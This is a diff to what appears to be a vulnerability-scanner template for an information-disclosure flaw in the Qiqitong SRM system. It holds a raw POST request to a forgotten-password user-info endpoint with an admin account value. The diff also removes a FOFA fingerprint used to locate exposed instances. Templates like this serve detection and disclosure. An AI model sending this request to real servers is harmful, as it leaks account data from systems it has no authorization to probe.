@@ -3,12 +3,8 @@ info:
   name: 企企通互联网解决方案系统srm getuserinfo 存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tkkl9cuasow269mw'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tkkl9cuasow269mw
-    fofa: body="welcome-srm-wrap"
 http:
 - raw:
   - 'POST /els/account/forgetPassword/getUserInfo?_t=1735121436 HTTP/1.1
@@ -28,7 +24,6 @@ http:
     Content-Type: application/json
 
     Content-Length: 28
-
 
 
     {"account":"100000_admin"}'
